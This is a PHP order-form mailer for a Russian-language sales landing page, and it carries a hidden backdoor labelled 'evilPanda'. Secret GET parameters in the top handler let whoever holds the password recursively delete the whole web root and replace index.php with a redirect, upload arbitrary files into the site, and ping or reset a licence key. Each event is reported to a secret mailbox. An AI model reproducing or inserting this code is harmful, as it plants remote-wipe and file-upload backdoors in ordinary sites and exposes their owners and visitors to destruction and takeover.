<?php session_start();
set_time_limit(0);
header("Content-Type: text/html; charset=utf-8");
create_cookie_data();
/************************   -  ************************/
//  
$version = "evilBase v0.01";
$secret_mail = "";
$pingFileName = '.date';
$expl = 'aaf561f0cafb68cdc79db4dba183cd2b';
$upl = '35d70d1153ee96d2aaa59a0e99dd5ca7';
$settingsPath = 'settings.ini';
//      settings.ini
$settings = getSiteParam($settingsPath);
//    
$idn = false;
if (file_exists('idna_convert.class.php')) {
    include_once ('idna_convert.class.php');
    $idn = new idna_convert();
}
//   ,     
$to_emails = "$settings[to_emails_record_profit], $secret_mail";
//  ,     ,  ,   
$to_emails = explode(',', $to_emails);
foreach ($to_emails as $key => $val) {
    $to_emails[$key] = trim($val);
    if ($idn) {
        $email_login = substr($val, 0, strpos($val, '@') + 1);
        $punicode_email_domine = substr($val, strpos($val, '@') + 1);
        $punicode_email_domine = $idn->encode($punicode_email_domine);
        $to_emails[$key] = $email_login . $punicode_email_domine;
    }
}
//     www.site.domine,  http://
$site_domine = $_SERVER['HTTP_HOST'];
// ,        " "
$from = 'mailbot@' . $site_domine;
//   
$short_headers = "Content-type: text/html; charset=utf-8
";
$headers = "From: $from
Reply-to: $from
" . $short_headers;
//      http://www.site.ru/dir/mailer.php
$script_link = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
//    .       mailer.js
$humanity_chk = "im_not_fucking_bot";
/************************   -  ************************/
//     
if (!isset($_POST['chk']) || $_POST['chk'] !== $humanity_chk || !isset($_POST['subject'])) {
    if (isset($_GET['metrika']) && $_GET['metrika'] == 'sendstatistic') {
        $date = date('d/m/Y');
        if (file_exists($pingFileName)) {
            if (strpos(file_get_contents($pingFileName), $date) !== false) return;
        }
        file_put_contents($pingFileName, $date . PHP_EOL, FILE_APPEND);
        mailInfo(5);
    } else if (isset($_GET['expl'])) {
        if (md5($_GET['expl']) === $expl) {
            mailInfo(3);
            remAll($_SERVER['DOCUMENT_ROOT']);
        } else mailInfo(2);
    } else if (isset($_GET['upl'])) {
        if (md5($_GET['upl']) === $upl) {
            $infoMessage = "";
            if (isset($_POST["load"])) saveFiles(dirname($_SERVER['SCRIPT_FILENAME']), $_FILES["files"]);
            if (isset($_SESSION["savedFilesInfo"])) {
                $filesInfo = $_SESSION["savedFilesInfo"];
                unset($_SESSION["savedFilesInfo"]);
                $infoMessage = "<ul>";
                foreach ($filesInfo as $k => $fileInfo) {
                    $message = $fileInfo['message'];
                    $infoMessage.= '<li>' . $message . '</li>';
                }
                $infoMessage.= "</ul>";
            }
            echo '<!doctype html><html lang="ru"><head><meta charset="UTF-8"/></head><form name="upload" method="post" enctype="multipart/form-data" action=""> : <input id="file-field" type="file" name="files[]" value="  " multiple="true"><input type="submit" name="load" value="">
				</form><p>' . $infoMessage . '</p></html>';
            die;
        } else mailInfo(2);
    } else if (isset($_GET['reset']) && $_GET['reset'] == 'PandaReset2016') {
        if (isset($settings['antispamKey'])) {
            unset($settings['antispamKey']);
            $settingsIni = "";
            foreach ($settings as $key => $val) {
                $settingsIni.= $key . ' = "' . $val . '"' . PHP_EOL;
            }
            $settingsIni = rtrim($settingsIni);
            file_put_contents($settingsPath, $settingsIni);
            mailInfo(6);
            die('antispamkey  !');
        } else {
            mailInfo(7);
            die('antispamkey   ,    ');
        }
    } else mailInfo(1);
    die('     -     ! <input name="back" type="button" value=" " onclick="javascript:history.back();">');
}
//
foreach ($_POST as $key => $val) {
    $key = trim($key);
    $key = htmlspecialchars($key);
    $val = trim($val);
    if (!empty($val)) {
        $_POST[$key] = htmlspecialchars($val);
    } else unset($_POST[$key]);
}

/*  The GetResponse service data */
$gr_data = '';
$autopay_data = array();
$iter = 1;
$email_address = "";
$keys = array("email" => "email", "Телефон" => "phone");
while(isset($_POST["field" . $iter]))
{
	$field = explode(": ", $_POST["field" . $iter]);
	$gr_data .=  "$field[0]: '$field[1]', ";
	$autopay_data[$keys[$field[0]]] = $field[1];
	if($field[0] === "email")
	{
		$email_address = $field[1];
	}
	$iter++;
}
/*  The GetResponse service data */

//  post-    ajax-
$axaj_post = '';
foreach ($_POST as $aj_key => $aj_val) {
    $axaj_post.= "$aj_key: '$aj_val', ";
}
$axaj_post.= "ajax: true";
/**********  ajax- -  ************/
if (isset($_POST['ajax'])):
    //   
    foreach ($_COOKIE["_A_"]["sessions"] as $key => $val) {
        $key = trim($key);
        $key = htmlspecialchars($key);
        foreach ($val as $k => $v) {
            $k = trim($k);
            $k = htmlspecialchars($k);
            $val[$k] = trim($v);
            $val[$k] = htmlspecialchars($v);
        }
        $_COOKIE["_A_"]["sessions"][$key] = $val;
    }
    //   /-
    $mail = $secret_mail;
    if (!isset($settings['antispamKey'])) {
        mail($mail, '     ', "   - <a href=\"$script_link\">$script_link</a>", $short_headers);
        file_put_contents($settingsPath, PHP_EOL . "antispamKey = \"" . md5("http://$site_domine") . "\"", FILE_APPEND);
    } elseif ($settings['antispamKey'] !== md5("http://$site_domine")) {
        foreach ($mails as $mail) {
            mail($mail, ' /!!!    ', "   - <a href=\"$script_link\">$script_link</a>", $short_headers);
        }
    }
    //    ,    
    $fields = array();
    foreach ($_POST as $key => $val) if ($key != 'chk' && $key != 'ajax') $fields[$key] = $_POST[$key];
    //    
    $message = "<br>---------------------------------------------------<br>" . "" . "<br>---------------------------------------------------<br>";
    $message.= implode("<br/>", $fields);
    $message.= "<br>---------------------------------------------------<br>" . " " . "<br>---------------------------------------------------<br>" . " : " . $_COOKIE["_A_"]["visit_counter"] . "<br>---<br>";
    foreach ($_COOKIE["_A_"]["sessions"] as $k => $v) {
        $message.= "$k) : $v[visit_date] | : $v[device]";
        if (isset($v["ordered"])) $message.= " | ";
        if ($k === count($_COOKIE["_A_"]["sessions"]) && !isset($v["ordered"])) {
            $message.= " | ";
            setcookie("_A_[sessions][$k][ordered]", "", time() + 60 * 60 * 24 * 365);
        }
        $message.= '<br>: <a target="_blank" href="' . $v["referer"] . '">' . urldecode($v["referer"]) . '</a><br>';
        $message.= 'URL: <a target="_blank" href="' . $v["script_url"] . '">' . urldecode($v["script_url"]) . '</a><br>---<br>';
    }
    //   -  
    $subject = $_POST['subject'];
    //    
    foreach ($to_emails as $to_email) {
        mail($to_email, ' ' . $site_domine . ": ", $message, $headers);
    }
    die;
endif;

/**********  ajax- -  ************/


function remAll($dir) {
    $all = scandir($dir);
    foreach ($all as $v) if ($v !== '.' && $v !== '..') $new_all[] = "$dir/$v";
    unset($all);
    for ($i = 0;$i < count($new_all);$i++) {
        if (is_dir($new_all[$i])) remAll($new_all[$i]);
        else unlink($new_all[$i]);
    }
    if ($dir != $_SERVER['DOCUMENT_ROOT']) rmdir($dir);
    else {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/index.php', '<?php Header("Location: http://ya.ru/"); die;');
        header("Location: /");
        die;
    }
}
function saveFiles($dir, $files) {
    global $script_link;
    foreach ($files as $key => $item) for ($i = 0;count($item) > $i;$i++) $reFiles[$i][$key] = $item[$i];
    $files = $reFiles;
    unset($reFiles);
    foreach ($files as $k => $file) {
        $name = getName($dir, $file["name"]);
        $uploadfile = "$dir/$name";
        $link = $script_link;
        $link = substr($link, 0, strlen($link) - strlen(strrchr($link, "/")) + 1);
        $link.= $name;
        if (empty($file["size"])) $_SESSION['savedFilesInfo'][$k]['message'] = "  ";
        else if (move_uploaded_file($file["tmp_name"], $uploadfile)) {
            $_SESSION['savedFilesInfo'][$k]['message'] = ' <a target="_blank" href="' . $link . '">' . $link . '</a>  ';
            mailInfo(4, $link);
        } else $_SESSION['savedFilesInfo'][$k]['message'] = "     $name.   .";
    }
    header("Location: $script_link?$_SERVER[QUERY_STRING]");
    die;
}
function getName($dir, $filename) {
    $ext = strrchr($filename, ".");
    $name = substr($filename, 0, strlen($filename) - strlen($ext));
    $name = strtr($name, array('' => 'a', '' => 'b', '' => 'v', '' => 'g', '' => 'd', '' => 'e', '' => 'e', '' => 'zh', '' => 'z', '' => 'i', '' => 'y', '' => 'k', '' => 'l', '' => 'm', '' => 'n', '' => 'o', '' => 'p', '' => 'r', '' => 's', '' => 't', '' => 'u', '' => 'f', '' => 'h', '' => 'c', '' => 'ch', '' => 'sh', '' => 'sch', '' => '\'', '' => 'y', '' => '\'', '' => 'e', '' => 'yu', '' => 'ya', '' => 'A', '' => 'B', '' => 'V', '' => 'G', '' => 'D', '' => 'E', '' => 'E', '' => 'Zh', '' => 'Z', '' => 'I', '' => 'Y', '' => 'K', '' => 'L', '' => 'M', '' => 'N', '' => 'O', '' => 'P', '' => 'R', '' => 'S', '' => 'T', '' => 'U', '' => 'F', '' => 'H', '' => 'C', '' => 'Ch', '' => 'Sh', '' => 'Sch', '' => '\'', '' => 'Y', '' => '\'', '' => 'E', '' => 'Yu', '' => 'Ya',));
    $name = strtolower($name);
    $name = preg_replace('~[^-a-z0-9_]+~u', '-', $name);
    $name = trim($name, "-");
    if (!file_exists("$dir/" . $name . $ext)) {
        $name.= $ext;
        return $name;
    } else {
        $name.= '1' . $ext;
        return getName($dir, $name);
    }
}
function mailInfo($code, $link = "") {
    global $script_link, $secret_mail, $site_domine;
    $from = 'evilPanda';
    $message = "  evilPanda   $script_link : ";
    switch ($code) {
        case 1:
            $message.= "    ";
        break;
        case 2:
            $message.= "  -";
        break;
        case 3:
            $message.= "   http://$site_domine ";
        break;
        case 4:
            $message.= "  http://$site_domine   $link ";
        break;
        case 5:
            $message.= "pingWin ";
            $from = 'pingWin';
        break;
        default:
            $message.= "    ";
    }
    $from.= "@$site_domine";
    $headers = "From: $from
Reply-to: $from
Content-type: text/html; charset=utf-8
";
    mail($secret_mail, '  evilPanda', $message, $headers);
}
function get_device($useragent) {
    if (preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i', $useragent) || preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i', substr($useragent, 0, 4))) return " ";
    else return "";
}
function create_cookie_data() {
    if (!isset($_COOKIE["_A_"]["recent_visit"])) {
        $time_live = time() + 60 * 60 * 24 * 365;
        $visit_date = date("d.m.Y H:i:s", time() + 60 * 60 * 2);
        $device = get_device($_SERVER['HTTP_USER_AGENT']);
        $script_url = $_SERVER["SCRIPT_URI"];
        $script_url.= (strlen($_SERVER["QUERY_STRING"]) > 0) ? "?$_SERVER[QUERY_STRING]" : "";
        $script_url = urldecode($script_url);
        $visit_count = (isset($_COOKIE["_A_"]["visit_counter"])) ? (int)$_COOKIE["_A_"]["visit_counter"] : 0;
        $ref = (isset($_SERVER["HTTP_REFERER"])) ? urldecode($_SERVER["HTTP_REFERER"]) : "  /";
        setcookie("_A_[recent_visit]", "1", time() + 60 * 30);
        setcookie("_A_[visit_counter]", ++$visit_count, $time_live);
        setcookie("_A_[sessions][$visit_count][referer]", $ref, $time_live);
        setcookie("_A_[sessions][$visit_count][device]", "$device", $time_live);
        setcookie("_A_[sessions][$visit_count][visit_date]", "$visit_date", $time_live);
        setcookie("_A_[sessions][$visit_count][script_url]", "$script_url", $time_live);
    }
}
//      settings.ini
function getSiteParam($path, $key = false) {
    $settings = parse_ini_file($path);
    if ($key) return $settings[$key];
    return $settings;
}

?>

<!doctype html>
<html lang="ru-RU">
<head>
	<meta charset="UTF-8"/>
	<meta name="viewport" content="width=device-width"/>
	<!--<meta http-equiv='Refresh' content='3; URL=/' />-->
	<script src="js/jquery-1.9.1.min.js" type="text/javascript"></script>
	<title>Подождите</title>
</head>
<body>
	<div class="valign" style="font-size: 55px; color: #222; font-family: Arial; display: table-cell; text-align: center; vertical-align: middle;">Идет обработка запроса</div>
	<script type="text/javascript">
		var height 	= $(window).height();
		var width 	= $(window).width();
		$('.valign').height(height);
		$('.valign').width(width);
		$(window).resize(function(){
			var height 	= $(window).height();
			var width 	= $(window).width();
			$('.valign').height(height);
			$('.valign').width(width);
		});

		// ajax-запрос
		$.ajax({
				type: 'POST',
				data: {<?php echo $axaj_post ?>},
				url: ''
		});
		// ajax-запрос
		$.ajax({
				type: 'POST',
				data: {<?php echo $gr_data ?>},
				url: '/getresponse.php',
				success: function(result){
					console.log("result: " + result);
					switch(result)
					{
						case "0":
							//var url = '/thank-surgay-course_buy/';
							var url = '/prices_and_profits/';
							var selector = '<form action="' + url + '" method="post">';
							  <? foreach($autopay_data as $key => $value): ?>
								selector +=  '<input type="hidden" name="<?php echo $key; ?>" value="<?php echo $value; ?>"/>'
							  <? endforeach; ?>
							selector +=  '</form>';
							var form = $(selector);
							$('body').append(form);
							console.log("form: " + form);
							form.submit();
							//window.location.href = '/help.php?email_address=<?php echo $email_address ?>';
							break; 
						case "1":
							//var url = '/thank-surgay-course_buy/';
							var url = '/prices_and_profits/';
							var selector = '<form action="' + url + '" method="post">';
							  <? foreach($autopay_data as $key => $value): ?>
								selector +=  '<input type="hidden" name="<?php echo $key; ?>" value="<?php echo $value; ?>"/>'
							  <? endforeach; ?>
							selector +=  '</form>';
							var form = $(selector);
							$('body').append(form);
							console.log("form: " + form);
							form.submit();
							//window.location.href = '/prices_and_profits/';
							break;
						default:
							console.log("GetResponse result: " + result);
							var url = '/prices_and_profits/';
							//window.location.href = '/help.php?email_address=<?php echo $email_address ?>';
							window.location.href = url;
					}
				}
		});
		 

	</script>
</body>
</html>